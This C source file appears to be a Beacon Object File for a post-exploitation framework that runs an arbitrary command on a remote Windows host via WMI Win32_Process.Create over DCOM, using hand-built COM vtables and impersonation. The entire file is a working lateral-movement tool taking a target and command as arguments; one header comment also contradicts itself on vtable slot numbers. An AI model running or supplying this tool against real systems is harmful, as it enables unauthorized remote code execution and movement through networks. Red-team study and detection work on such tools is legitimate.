/*
 * wmiexec.c — Remote command execution via WMI (DCOM)
 *
 * Uses COM/DCOM:
 *   CoInitializeEx -> CoCreateInstance(CLSID_WbemLocator) ->
 *   IWbemLocator::ConnectServer("\\\\target\\ROOT\\CIMV2") ->
 *   IWbemServices::GetObject("Win32_Process") ->
 *   IWbemClassObject::GetMethod("Create") ->
 *   SpawnInstance -> Put("CommandLine") -> ExecMethod
 *
 * We use the COM vtable approach (no #import, no type library).
 */
#include <windows.h>
#include <objbase.h>
#include "beacon_compat.h"

/* ── WMI GUIDs ── */
/* CLSID_WbemLocator: {4590F811-1D3A-11D0-891F-00AA004B2E24} */
static const GUID CLSID_WbemLocator = {
    0x4590F811, 0x1D3A, 0x11D0,
    {0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}
};

/* IID_IWbemLocator: {DC12A687-737F-11CF-884D-00AA004B2E24} */
static const GUID IID_IWbemLocator = {
    0xDC12A687, 0x737F, 0x11CF,
    {0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}
};

/* ── Minimal COM vtable definitions ── */

/* Forward declarations */
typedef struct IWbemLocator IWbemLocator;
typedef struct IWbemServices IWbemServices;
typedef struct IWbemClassObject IWbemClassObject;

/* IWbemLocator vtable */
typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IWbemLocator*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IWbemLocator*);
    ULONG   (STDMETHODCALLTYPE *Release)(IWbemLocator*);
    HRESULT (STDMETHODCALLTYPE *ConnectServer)(
        IWbemLocator*, BSTR, BSTR, BSTR, BSTR, long, BSTR, void*, IWbemServices**);
} IWbemLocatorVtbl;
struct IWbemLocator { IWbemLocatorVtbl *lpVtbl; };

/*
 * IWbemServices vtable — we need GetObject (slot 6) and ExecMethod (slot 24).
 * IUnknown: 0=QI, 1=AddRef, 2=Release
 * IWbemServices: 3=OpenNamespace, 4=CancelAsyncCall, 5=QueryObjectSink,
 *   6=GetObject, 7=GetObjectAsync, 8=PutClass, 9=PutClassAsync,
 *   10=DeleteClass, 11=DeleteClassAsync, 12=CreateClassEnum,
 *   13=CreateClassEnumAsync, 14=PutInstance, 15=PutInstanceAsync,
 *   16=DeleteInstance, 17=DeleteInstanceAsync, 18=CreateInstanceEnum,
 *   19=CreateInstanceEnumAsync, 20=ExecQuery, 21=ExecQueryAsync,
 *   22=ExecNotificationQuery, 23=ExecNotificationQueryAsync,
 *   24=ExecMethod, 25=ExecMethodAsync
 */
typedef struct {
    /* IUnknown (slots 0-2) */
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IWbemServices*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IWbemServices*);
    ULONG   (STDMETHODCALLTYPE *Release)(IWbemServices*);
    /* Slots 3-5 */
    void *_pad_3_5[3];
    /* Slot 6: GetObject */
    HRESULT (STDMETHODCALLTYPE *GetObject)(
        IWbemServices*, BSTR strObjectPath, long lFlags,
        void *pCtx, IWbemClassObject **ppObject, void **ppCallResult);
    /* Slots 7-23 */
    void *_pad_7_23[17];
    /* Slot 24: ExecMethod */
    HRESULT (STDMETHODCALLTYPE *ExecMethod)(
        IWbemServices*, BSTR strObjectPath, BSTR strMethodName,
        long lFlags, void *pCtx, IWbemClassObject *pInParams,
        IWbemClassObject **ppOutParams, void **ppCallResult);
} IWbemServicesVtbl;
struct IWbemServices { IWbemServicesVtbl *lpVtbl; };

/*
 * IWbemClassObject vtable — we need GetMethod (slot 20), SpawnInstance (slot 15),
 * Put (slot 5), Get (slot 4).
 * IUnknown: 0=QI, 1=AddRef, 2=Release
 * IWbemClassObject: 3=GetQualifierSet, 4=Get, 5=Put, 6=Delete,
 *   7=GetNames, 8=BeginEnumeration, 9=Next, 10=EndEnumeration,
 *   11=GetPropertyQualifierSet, 12=Clone, 13=GetObjectText,
 *   14=SpawnDerivedClass, 15=SpawnInstance, 16=CompareTo,
 *   17=GetPropertyOrigin, 18=InheritsFrom, 19=GetMethodQualifierSet (wrong)
 *   Actually for IWbemClassObject the vtable is:
 *   3=GetQualifierSet, 4=Get, 5=Put, 6=Delete, 7=GetNames,
 *   8=BeginEnumeration, 9=Next, 10=EndEnumeration,
 *   11=GetPropertyQualifierSet, 12=Clone, 13=GetObjectText,
 *   14=SpawnDerivedClass, 15=SpawnInstance, 16=CompareTo,
 *   17=GetPropertyOrigin, 18=InheritsFrom, 19=GetMethod,
 *   20=PutMethod, 21=DeleteMethod, 22=BeginMethodEnumeration,
 *   23=NextMethod, 24=EndMethodEnumeration, 25=GetMethodQualifierSet,
 *   26=GetMethodOrigin
 */
typedef struct {
    /* IUnknown (slots 0-2) */
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IWbemClassObject*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IWbemClassObject*);
    ULONG   (STDMETHODCALLTYPE *Release)(IWbemClassObject*);
    /* Slot 3: GetQualifierSet */
    void *_pad_3;
    /* Slot 4: Get */
    HRESULT (STDMETHODCALLTYPE *Get)(
        IWbemClassObject*, LPCWSTR wszName, long lFlags,
        VARIANT *pVal, long *pType, long *plFlavor);
    /* Slot 5: Put */
    HRESULT (STDMETHODCALLTYPE *Put)(
        IWbemClassObject*, LPCWSTR wszName, long lFlags,
        VARIANT *pVal, long vtType);
    /* Slots 6-14 */
    void *_pad_6_14[9];
    /* Slot 15: SpawnInstance */
    HRESULT (STDMETHODCALLTYPE *SpawnInstance)(
        IWbemClassObject*, long lFlags, IWbemClassObject **ppNewInstance);
    /* Slots 16-18 */
    void *_pad_16_18[3];
    /* Slot 19: GetMethod */
    HRESULT (STDMETHODCALLTYPE *GetMethod)(
        IWbemClassObject*, LPCWSTR wszName, long lFlags,
        IWbemClassObject **ppInSignature, IWbemClassObject **ppOutSignature);
} IWbemClassObjectVtbl;
struct IWbemClassObject { IWbemClassObjectVtbl *lpVtbl; };

/* ── BOF-style imports ── */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(
    IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);

DECLSPEC_IMPORT int  WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

DECLSPEC_IMPORT BSTR WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void WINAPI OLEAUT32$VariantInit(VARIANT*);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANT*);

DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *target = BeaconDataExtract(&parser, NULL);
    char *command = BeaconDataExtract(&parser, NULL);

    if (!target || !*target || !command || !*command) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: wmiexec --target HOST --command CMD\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] WMI exec on %s: %s\n", target, command);

    /* Initialize COM */
    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != (HRESULT)0x80010106) { /* RPC_E_CHANGED_MODE is OK */
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeEx failed: 0x%08lX\n", (unsigned long)hr);
        return;
    }

    /* Create WbemLocator */
    IWbemLocator *locator = NULL;
    hr = OLE32$CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                                &IID_IWbemLocator, (void**)&locator);
    if (FAILED(hr) || !locator) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoCreateInstance(WbemLocator) failed: 0x%08lX\n", (unsigned long)hr);
        OLE32$CoUninitialize();
        return;
    }

    /* Build connection string: \\\\target\\ROOT\\CIMV2 */
    wchar_t connStr[512];
    wchar_t wTarget[256];
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);
    MSVCRT$swprintf(connStr, 512, L"\\\\%s\\ROOT\\CIMV2", wTarget);

    BSTR bstrConn = OLEAUT32$SysAllocString(connStr);

    /* Connect to remote WMI */
    IWbemServices *services = NULL;
    hr = locator->lpVtbl->ConnectServer(locator, bstrConn,
        NULL, NULL, NULL, 0, NULL, NULL, &services);
    OLEAUT32$SysFreeString(bstrConn);

    if (FAILED(hr) || !services) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ConnectServer failed: 0x%08lX\n", (unsigned long)hr);
        locator->lpVtbl->Release(locator);
        OLE32$CoUninitialize();
        return;
    }

    /* Set security blanket for impersonation */
    OLE32$CoSetProxyBlanket((IUnknown*)services,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Connected to WMI on %s\n", target);

    /* ── Get Win32_Process class ── */
    BSTR bstrClass = OLEAUT32$SysAllocString(L"Win32_Process");
    IWbemClassObject *classObj = NULL;
    hr = services->lpVtbl->GetObject(services, bstrClass, 0, NULL, &classObj, NULL);
    OLEAUT32$SysFreeString(bstrClass);

    if (FAILED(hr) || !classObj) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetObject(Win32_Process) failed: 0x%08lX\n", (unsigned long)hr);
        services->lpVtbl->Release(services);
        locator->lpVtbl->Release(locator);
        OLE32$CoUninitialize();
        return;
    }

    /* ── Get "Create" method signature ── */
    IWbemClassObject *inParamsDef = NULL;
    hr = classObj->lpVtbl->GetMethod(classObj, L"Create", 0, &inParamsDef, NULL);
    classObj->lpVtbl->Release(classObj);

    if (FAILED(hr) || !inParamsDef) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetMethod(Create) failed: 0x%08lX\n", (unsigned long)hr);
        services->lpVtbl->Release(services);
        locator->lpVtbl->Release(locator);
        OLE32$CoUninitialize();
        return;
    }

    /* ── Spawn an instance of the input parameters ── */
    IWbemClassObject *inParams = NULL;
    hr = inParamsDef->lpVtbl->SpawnInstance(inParamsDef, 0, &inParams);
    inParamsDef->lpVtbl->Release(inParamsDef);

    if (FAILED(hr) || !inParams) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SpawnInstance failed: 0x%08lX\n", (unsigned long)hr);
        services->lpVtbl->Release(services);
        locator->lpVtbl->Release(locator);
        OLE32$CoUninitialize();
        return;
    }

    /* ── Set CommandLine parameter ── */
    wchar_t wCommand[4096];
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, command, -1, wCommand, 4096);

    VARIANT vtCmd;
    OLEAUT32$VariantInit(&vtCmd);
    vtCmd.vt = VT_BSTR;
    vtCmd.bstrVal = OLEAUT32$SysAllocString(wCommand);

    hr = inParams->lpVtbl->Put(inParams, L"CommandLine", 0, &vtCmd, 0);
    OLEAUT32$VariantClear(&vtCmd);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Put(CommandLine) failed: 0x%08lX\n", (unsigned long)hr);
        inParams->lpVtbl->Release(inParams);
        services->lpVtbl->Release(services);
        locator->lpVtbl->Release(locator);
        OLE32$CoUninitialize();
        return;
    }

    /* ── Execute Win32_Process.Create ── */
    BSTR bstrObjPath = OLEAUT32$SysAllocString(L"Win32_Process");
    BSTR bstrMethod  = OLEAUT32$SysAllocString(L"Create");

    IWbemClassObject *outParams = NULL;
    hr = services->lpVtbl->ExecMethod(services, bstrObjPath, bstrMethod,
                                       0, NULL, inParams, &outParams, NULL);
    OLEAUT32$SysFreeString(bstrObjPath);
    OLEAUT32$SysFreeString(bstrMethod);
    inParams->lpVtbl->Release(inParams);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ExecMethod(Create) failed: 0x%08lX\n", (unsigned long)hr);
        services->lpVtbl->Release(services);
        locator->lpVtbl->Release(locator);
        OLE32$CoUninitialize();
        return;
    }

    /* ── Read results: ReturnValue and ProcessId ── */
    if (outParams) {
        VARIANT vtRet, vtPid;
        OLEAUT32$VariantInit(&vtRet);
        OLEAUT32$VariantInit(&vtPid);

        outParams->lpVtbl->Get(outParams, L"ReturnValue", 0, &vtRet, NULL, NULL);
        outParams->lpVtbl->Get(outParams, L"ProcessId", 0, &vtPid, NULL, NULL);

        DWORD retVal = (vtRet.vt == VT_I4) ? vtRet.lVal : (DWORD)-1;
        DWORD pid    = (vtPid.vt == VT_I4) ? vtPid.lVal :
                       (vtPid.vt == VT_UI4) ? vtPid.ulVal : 0;

        if (retVal == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Process created successfully (PID: %u)\n", pid);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Win32_Process.Create returned %u\n", retVal);
        }

        OLEAUT32$VariantClear(&vtRet);
        OLEAUT32$VariantClear(&vtPid);
        outParams->lpVtbl->Release(outParams);
    }

    /* Cleanup */
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);
    OLE32$CoUninitialize();
}
